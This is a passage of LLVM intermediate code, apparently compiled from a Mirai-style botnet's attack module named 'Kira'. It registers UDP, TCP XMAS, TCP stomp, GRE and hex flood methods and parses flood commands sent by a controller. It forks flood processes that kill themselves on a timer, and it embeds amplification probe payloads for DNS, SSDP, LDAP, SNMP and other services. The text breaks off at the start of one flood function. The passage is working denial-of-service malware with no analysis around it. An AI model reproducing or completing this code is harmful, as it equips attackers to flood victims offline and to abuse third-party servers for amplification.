; ModuleID = 'host/ir_O3/Kira.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.attack_xmas_data = type { i32, i32, i32, i16, i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }

@methods_len = local_unnamed_addr global i8 0, align 1
@methods = local_unnamed_addr global %struct.attack_method** null, align 8
@attack_ongoing = local_unnamed_addr global [1 x i32] zeroinitializer, align 4
@LOCAL_ADDR = common local_unnamed_addr global i32 0, align 4
@.str.1 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [31 x i8] c"\01\00\00\01\00\00\00\00\00\00\03www\06google\03com\00\00\01\00\01\00", align 1
@.str.3 = private unnamed_addr constant [31 x i8] c"\01\00\00\01\00\00\00\00\00\00\03www\06google\03com\00\00\05\00\01\00", align 1
@.str.4 = private unnamed_addr constant [41 x i8] c"r\FE\1D\13\00\00\00\00\00\00\00\02\00\01\86\A0\00\01\97|\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.5 = private unnamed_addr constant [49 x i8] c"\D9\00\0A\FA\00\00\00\00\00\01\02\90\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\C5\02\04\EC\ECB\EE\92\00", align 1
@.str.6 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.7 = private unnamed_addr constant [61 x i8] c"0:\02\01\030\0F\02\02Ji\02\03\00\FF\E3\04\01\04\02\01\03\04\100\0E\04\00\02\01\00\02\01\00\04\00\04\00\04\000\12\04\00\04\00\A0\0C\02\027\F0\02\01\00\02\01\000\00\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"\00\01\00\02\00\01\00\00", align 1
@.str.9 = private unnamed_addr constant [52 x i8] c"0\84\00\00\00-\02\01\07c\84\00\00\00$\04\00\0A\01\00\0A\01\00\02\01\00\02\01d\01\01\00\87\0BobjectClass0\84\00\00\00\00\00", align 1
@.str.10 = private unnamed_addr constant [54 x i8] c"\02\01\00\06 \00\00\00\00\00\01\00.n\00\00\00\15service:service-agent\00\07 default\00\00\00\00\00", align 1
@.str.11 = private unnamed_addr constant [157 x i8] c"\00\11\223DUfw\00\00\00\00\00\00\00\00\01\10\02\00\00\00\00\00\00\00\00\C0\00\00\00\A4\00\00\00\01\00\00\00\01\00\00\00\98\01\01\00\04\03\00\00$\01\01\00\00\80\01\00\05\80\02\00\02\80\03\00\01\80\04\00\02\80\0B\00\01\00\0C\00\04\00\00\00\01\03\00\00$\02\01\00\00\80\01\00\05\80\02\00\01\80\03\00\01\80\04\00\02\80\0B\00\01\00\0C\00\04\00\00\00\01\03\00\00$\03\01\00\00\80\01\00\01\80\02\00\02\80\03\00\01\80\04\00\02\80\0B\00\01\00\0C\00\04\00\00\00\01\00", align 1
@.str.12 = private unnamed_addr constant [25 x i8] c"\01\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\10\00", align 1
@.str.13 = private unnamed_addr constant [24 x i8] c"\06\00\FF\07\00\00\00\00\00\00\00\00\00\09 \18\C8\81\008\8E\04\B5\00", align 1
@.str.14 = private unnamed_addr constant [31 x i8] c"SNQUERY: 127.0.0.1:AAAAAA:xsvr\00", align 1
@.str.15 = private unnamed_addr constant [15 x i8] c"8d\C1x\01\B8\9B\CB\8F\00\00\00\00\00\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"\02\00", align 1
@.str.17 = private unnamed_addr constant [31 x i8] c"\1E\00\010\02\FD\A8\E3\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.18 = private unnamed_addr constant [174 x i8] c"M-SEARCH * HTTP/1.1\0D\0AHOST: 255.255.255.255:1900\0D\0AMAN: \22ssdp:discover\22\0D\0AMX: 1\0D\0AST: urn:dial-multiscreen-org:service:dial:1\0D\0AUSER-AGENT: Google Chrome/60.0.3112.90 Windows\0D\0A\0D\0A\00", align 1
@.str.19 = private unnamed_addr constant [47 x i8] c"\00\00\00\00\00\01\00\00\00\00\00\00\09_services\07_dns-sd\04_udp\05local\00\00\0C\00\01\00", align 1
@.str.20 = private unnamed_addr constant [182 x i8] c"xf4\BE\03\00\00\00\00\00\00\00\00\00\01\00\00\02x\BA\85\09TeamSpeak\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0AWindows XP\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\02\00\00\00 \00<\00\00\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\08nickname\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.21 = private unnamed_addr constant [163 x i8] c"\05\CA\7F\16\9C\11\F9\89\00\00\00\00\02\9Dt\8BE\AA{\EF\B9\9E\FE\AD\08\19\BA\CFA\E0\16\A22l\F3\CF\F4\8E<D\83\C8\8DQEo\90\95#>\00\97+\1Cq\B2N\C0a\F1\D7o\C5~\F6HR\BF\82j\A2;e\AA\18z\178\C3\81'\C3G\FC\A75\BA\FC\0F\9D\9Dr$\9D\FC\02\17mk\B1-r\C6\E3\17\1C\95\D9i\99W\CE\DD\DF\05\DC\03\94V\04:\14\E5\AD\9A+\140:#\A3%\AD\E8\E69\8A\85*\C6\DF\E5]-\A0/]\9C\D7+$\FB\B0\9C\C2\BA\89\B4\1B\17\A2\B6\00", align 1
@hexPayload = local_unnamed_addr global i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str, i64 0, i64 0), align 8
@.str = private unnamed_addr constant [1021 x i8] c"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A\00", align 1
@table = common local_unnamed_addr global [41 x %struct.table_value] zeroinitializer, align 16
@table_key = local_unnamed_addr global i32 -1287662771, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() local_unnamed_addr #0 {
  tail call fastcc void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpgeneric)
  tail call fastcc void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpvse)
  tail call fastcc void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpplain)
  tail call fastcc void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpxmas)
  tail call fastcc void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_nudp)
  tail call fastcc void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpack)
  tail call fastcc void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpstomp)
  tail call fastcc void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_std)
  tail call fastcc void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_gre_ip)
  tail call fastcc void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_stdhex)
  tail call fastcc void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udphex)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) unnamed_addr #0 {
  %3 = tail call noalias i8* @calloc(i64 1, i64 16) #11
  %4 = getelementptr inbounds i8, i8* %3, i64 8
  store i8 %0, i8* %4, align 8
  %5 = bitcast i8* %3 to void (i8, %struct.attack_target*, i8, %struct.attack_option*)**
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %5, align 8
  %6 = load i8*, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %7 = load i8, i8* @methods_len, align 1
  %8 = zext i8 %7 to i64
  %9 = shl nuw nsw i64 %8, 3
  %10 = add nuw nsw i64 %9, 8
  %11 = tail call i8* @realloc(i8* %6, i64 %10) #11
  %12 = bitcast i8* %11 to %struct.attack_method**
  store i8* %11, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %13 = load i8, i8* @methods_len, align 1
  %14 = add i8 %13, 1
  store i8 %14, i8* @methods_len, align 1
  %15 = zext i8 %13 to i64
  %16 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %12, i64 %15
  %17 = bitcast %struct.attack_method** %16 to i8**
  store i8* %3, i8** %17, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #1

; Function Attrs: nounwind
declare noalias i8* @realloc(i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() local_unnamed_addr #0 {
  %1 = load i32, i32* getelementptr inbounds ([1 x i32], [1 x i32]* @attack_ongoing, i64 0, i64 0), align 4
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @kill(i32 %1, i32 9) #11
  br label %5

; <label>:5:                                      ; preds = %0, %3
  store i32 0, i32* getelementptr inbounds ([1 x i32], [1 x i32]* @attack_ongoing, i64 0, i64 0), align 4
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) local_unnamed_addr #0 {
  %3 = icmp ult i32 %1, 4
  br i1 %3, label %.thread80, label %4

; <label>:4:                                      ; preds = %2
  %5 = bitcast i8* %0 to i32*
  %6 = load i32, i32* %5, align 4
  %7 = tail call i32 @ntohl(i32 %6) #12
  %8 = icmp eq i32 %1, 4
  br i1 %8, label %.thread80, label %9

; <label>:9:                                      ; preds = %4
  %10 = getelementptr inbounds i8, i8* %0, i64 4
  %11 = load i8, i8* %10, align 1
  %12 = icmp eq i32 %1, 5
  br i1 %12, label %.thread80, label %13

; <label>:13:                                     ; preds = %9
  %14 = getelementptr inbounds i8, i8* %0, i64 5
  %15 = getelementptr inbounds i8, i8* %0, i64 6
  %16 = load i8, i8* %14, align 1
  %17 = add i32 %1, -6
  %18 = zext i8 %16 to i32
  %19 = icmp eq i8 %16, 0
  br i1 %19, label %.thread80, label %20

; <label>:20:                                     ; preds = %13
  %21 = sext i32 %17 to i64
  %22 = zext i8 %16 to i64
  %23 = mul nuw nsw i64 %22, 5
  %24 = icmp ult i64 %21, %23
  br i1 %24, label %.thread80, label %.lr.ph88.preheader

.lr.ph88.preheader:                               ; preds = %20
  %25 = tail call noalias i8* @calloc(i64 %22, i64 24) #11
  %26 = bitcast i8* %25 to %struct.attack_target*
  %27 = add nsw i32 %18, -1
  %28 = zext i32 %27 to i64
  %29 = mul nuw nsw i64 %28, 5
  %30 = add nuw nsw i64 %29, 11
  %scevgep = getelementptr i8, i8* %0, i64 %30
  %wide.trip.count = zext i8 %16 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph88.prol.loopexit, label %.lr.ph88.prol.preheader

.lr.ph88.prol.preheader:                          ; preds = %.lr.ph88.preheader
  br label %.lr.ph88.prol

.lr.ph88.prol:                                    ; preds = %.lr.ph88.prol.preheader
  %31 = bitcast i8* %15 to i32*
  %32 = load i32, i32* %31, align 4
  %33 = getelementptr inbounds i8, i8* %25, i64 16
  %34 = bitcast i8* %33 to i32*
  store i32 %32, i32* %34, align 4
  %35 = getelementptr inbounds i8, i8* %0, i64 10
  %36 = getelementptr inbounds i8, i8* %0, i64 11
  %37 = load i8, i8* %35, align 1
  %38 = getelementptr inbounds i8, i8* %25, i64 20
  store i8 %37, i8* %38, align 4
  %39 = bitcast i8* %25 to i16*
  store i16 2, i16* %39, align 4
  %40 = getelementptr inbounds i8, i8* %25, i64 4
  %41 = bitcast i8* %40 to i32*
  store i32 %32, i32* %41, align 4
  br label %.lr.ph88.prol.loopexit

.lr.ph88.prol.loopexit:                           ; preds = %.lr.ph88.preheader, %.lr.ph88.prol
  %indvars.iv91.unr = phi i64 [ 0, %.lr.ph88.preheader ], [ 1, %.lr.ph88.prol ]
  %.087.unr = phi i8* [ %15, %.lr.ph88.preheader ], [ %36, %.lr.ph88.prol ]
  %42 = icmp eq i8 %16, 1
  br i1 %42, label %._crit_edge, label %.lr.ph88.preheader.new

.lr.ph88.preheader.new:                           ; preds = %.lr.ph88.prol.loopexit
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88, %.lr.ph88.preheader.new
  %indvars.iv91 = phi i64 [ %indvars.iv91.unr, %.lr.ph88.preheader.new ], [ %indvars.iv.next92.1, %.lr.ph88 ]
  %.087 = phi i8* [ %.087.unr, %.lr.ph88.preheader.new ], [ %56, %.lr.ph88 ]
  %43 = bitcast i8* %.087 to i32*
  %44 = load i32, i32* %43, align 4
  %45 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 1
  store i32 %44, i32* %45, align 4
  %46 = getelementptr inbounds i8, i8* %.087, i64 4
  %47 = getelementptr inbounds i8, i8* %.087, i64 5
  %48 = load i8, i8* %46, align 1
  %49 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 2
  store i8 %48, i8* %49, align 4
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 0
  store i16 2, i16* %50, align 4
  %51 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 2, i32 0
  store i32 %44, i32* %51, align 4
  %indvars.iv.next92 = add nuw nsw i64 %indvars.iv91, 1
  %52 = bitcast i8* %47 to i32*
  %53 = load i32, i32* %52, align 4
  %54 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 1
  store i32 %53, i32* %54, align 4
  %55 = getelementptr inbounds i8, i8* %.087, i64 9
  %56 = getelementptr inbounds i8, i8* %.087, i64 10
  %57 = load i8, i8* %55, align 1
  %58 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 2
  store i8 %57, i8* %58, align 4
  %59 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 0
  store i16 2, i16* %59, align 4
  %60 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 2, i32 0
  store i32 %53, i32* %60, align 4
  %indvars.iv.next92.1 = add nsw i64 %indvars.iv91, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next92.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.unr-lcssa, label %.lr.ph88

._crit_edge.unr-lcssa:                            ; preds = %.lr.ph88
  br label %._crit_edge

._crit_edge:                                      ; preds = %.lr.ph88.prol.loopexit, %._crit_edge.unr-lcssa
  %61 = mul nsw i32 %18, -5
  %62 = add i32 %17, %61
  %63 = icmp eq i32 %62, 0
  br i1 %63, label %.loopexit81.thread, label %64

; <label>:64:                                     ; preds = %._crit_edge
  %65 = load i8, i8* %scevgep, align 1
  %66 = icmp eq i8 %65, 0
  br i1 %66, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %64
  %67 = zext i8 %65 to i64
  %68 = tail call noalias i8* @calloc(i64 %67, i64 16) #11
  %69 = bitcast i8* %68 to %struct.attack_option*
  %70 = getelementptr inbounds i8, i8* %scevgep, i64 1
  %71 = add i32 %62, -1
  %72 = zext i8 %65 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %85
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %85 ]
  %.184 = phi i8* [ %70, %.lr.ph.preheader ], [ %91, %85 ]
  %.17583 = phi i32 [ %71, %.lr.ph.preheader ], [ %92, %85 ]
  %73 = icmp eq i32 %.17583, 0
  br i1 %73, label %.loopexit81.loopexit, label %74

; <label>:74:                                     ; preds = %.lr.ph
  %75 = load i8, i8* %.184, align 1
  %76 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %69, i64 %indvars.iv, i32 1
  store i8 %75, i8* %76, align 8
  %77 = icmp eq i32 %.17583, 1
  br i1 %77, label %.loopexit81.loopexit, label %78

; <label>:78:                                     ; preds = %74
  %79 = getelementptr inbounds i8, i8* %.184, i64 1
  %80 = getelementptr inbounds i8, i8* %.184, i64 2
  %81 = load i8, i8* %79, align 1
  %82 = add i32 %.17583, -2
  %83 = zext i8 %81 to i32
  %84 = icmp slt i32 %82, %83
  br i1 %84, label %.loopexit81.loopexit, label %85

; <label>:85:                                     ; preds = %78
  %86 = add nuw nsw i32 %83, 1
  %87 = zext i32 %86 to i64
  %88 = tail call noalias i8* @calloc(i64 %87, i64 1) #11
  %89 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %69, i64 %indvars.iv, i32 0
  store i8* %88, i8** %89, align 8
  tail call void @util_memcpy(i8* %88, i8* %80, i32 %83) #11
  %90 = zext i8 %81 to i64
  %91 = getelementptr inbounds i8, i8* %80, i64 %90
  %92 = sub nsw i32 %82, %83
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %93 = icmp slt i64 %indvars.iv.next, %72
  br i1 %93, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %85
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %64
  %.070 = phi %struct.attack_option* [ null, %64 ], [ %69, %.loopexit.loopexit ]
  %94 = tail call i32* @__errno_location() #12
  store i32 0, i32* %94, align 4
  tail call void @attack_start(i32 %7, i8 zeroext %11, i8 zeroext %16, %struct.attack_target* %26, i8 zeroext %65, %struct.attack_option* %.070)
  br label %.loopexit81

.loopexit81.loopexit:                             ; preds = %.lr.ph, %74, %78
  br label %.loopexit81

.loopexit81:                                      ; preds = %.loopexit81.loopexit, %.loopexit
  %.171 = phi %struct.attack_option* [ %.070, %.loopexit ], [ %69, %.loopexit81.loopexit ]
  %95 = icmp eq i8* %25, null
  br i1 %95, label %96, label %.loopexit81.thread

.loopexit81.thread:                               ; preds = %._crit_edge, %.loopexit81
  %.17195 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ null, %._crit_edge ]
  %.07393 = phi i8 [ %65, %.loopexit81 ], [ undef, %._crit_edge ]
  tail call void @free(i8* nonnull %25) #11
  br label %96

; <label>:96:                                     ; preds = %.loopexit81, %.loopexit81.thread
  %.17196 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ %.17195, %.loopexit81.thread ]
  %.07394 = phi i8 [ %65, %.loopexit81 ], [ %.07393, %.loopexit81.thread ]
  %97 = icmp eq %struct.attack_option* %.17196, null
  br i1 %97, label %.thread80, label %98

; <label>:98:                                     ; preds = %96
  %99 = zext i8 %.07394 to i32
  tail call fastcc void @free_opts(%struct.attack_option* nonnull %.17196, i32 %99)
  br label %.thread80

.thread80:                                        ; preds = %2, %4, %9, %13, %20, %96, %98
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #2

declare void @util_memcpy(i8*, i8*, i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) local_unnamed_addr #0 {
  %7 = tail call i32 @fork() #11
  %8 = icmp eq i32 %7, -1
  %9 = icmp sgt i32 %7, 0
  %or.cond = or i1 %8, %9
  br i1 %or.cond, label %10, label %11

; <label>:10:                                     ; preds = %6
  ret void

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @fork() #11
  switch i32 %12, label %.preheader [
    i32 -1, label %17
    i32 0, label %18
  ]

.preheader:                                       ; preds = %11
  %13 = load i8, i8* @methods_len, align 1
  %14 = icmp eq i8 %13, 0
  br i1 %14, label %.loopexit, label %.lr.ph

.lr.ph:                                           ; preds = %.preheader
  %15 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %16 = zext i8 %13 to i64
  br label %24

; <label>:17:                                     ; preds = %11
  tail call void @exit(i32 0) #13
  unreachable

; <label>:18:                                     ; preds = %11
  %19 = tail call i32 @sleep(i32 %0) #11
  %20 = tail call i32 @getppid() #11
  %21 = tail call i32 @kill(i32 %20, i32 9) #11
  tail call void @exit(i32 0) #13
  unreachable

; <label>:22:                                     ; preds = %24
  %23 = icmp slt i64 %indvars.iv.next, %16
  br i1 %23, label %24, label %.loopexit.loopexit

; <label>:24:                                     ; preds = %.lr.ph, %22
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %22 ]
  %25 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %15, i64 %indvars.iv
  %26 = load %struct.attack_method*, %struct.attack_method** %25, align 8
  %27 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %26, i64 0, i32 1
  %28 = load i8, i8* %27, align 8
  %29 = icmp eq i8 %28, %1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %29, label %30, label %22

; <label>:30:                                     ; preds = %24
  %31 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %26, i64 0, i32 0
  %32 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %31, align 8
  tail call void %32(i8 zeroext %2, %struct.attack_target* %3, i8 zeroext %4, %struct.attack_option* %5) #11
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %22
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %30
  tail call void @exit(i32 0) #13
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @free_opts(%struct.attack_option*, i32) unnamed_addr #0 {
  %3 = icmp eq %struct.attack_option* %0, null
  br i1 %3, label %11, label %.preheader

.preheader:                                       ; preds = %2
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %9
  %indvars.iv = phi i64 [ %indvars.iv.next, %9 ], [ 0, %.lr.ph.preheader ]
  %5 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %0, i64 %indvars.iv, i32 0
  %6 = load i8*, i8** %5, align 8
  %7 = icmp eq i8* %6, null
  br i1 %7, label %9, label %8

; <label>:8:                                      ; preds = %.lr.ph
  tail call void @free(i8* nonnull %6) #11
  br label %9

; <label>:9:                                      ; preds = %.lr.ph, %8
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %9
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %10 = bitcast %struct.attack_option* %0 to i8*
  tail call void @free(i8* %10) #11
  br label %11

; <label>:11:                                     ; preds = %2, %._crit_edge
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #4

declare i32 @sleep(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getppid() local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i8* readnone) local_unnamed_addr #5 {
  %5 = icmp eq i8 %0, 0
  br i1 %5, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %4
  %6 = zext i8 %0 to i64
  br label %.lr.ph

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp slt i64 %indvars.iv.next, %6
  br i1 %8, label %.lr.ph, label %.loopexit.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %7
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %7 ]
  %9 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 1
  %10 = load i8, i8* %9, align 8
  %11 = icmp eq i8 %10, %2
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %11, label %12, label %7

; <label>:12:                                     ; preds = %.lr.ph
  %13 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 0
  %14 = load i8*, i8** %13, align 8
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %7
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %12
  %.09 = phi i8* [ %14, %12 ], [ %3, %4 ], [ %3, %.loopexit.loopexit ]
  ret i8* %.09
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @util_atoi(i8* nonnull %5, i32 10) #11
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

declare i32 @util_atoi(i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @inet_addr(i8* nonnull %5) #11
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_nudp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca [22 x i8*], align 16
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 0
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i8** %7, align 16
  %8 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 1
  %9 = tail call signext i8 @random_hex()
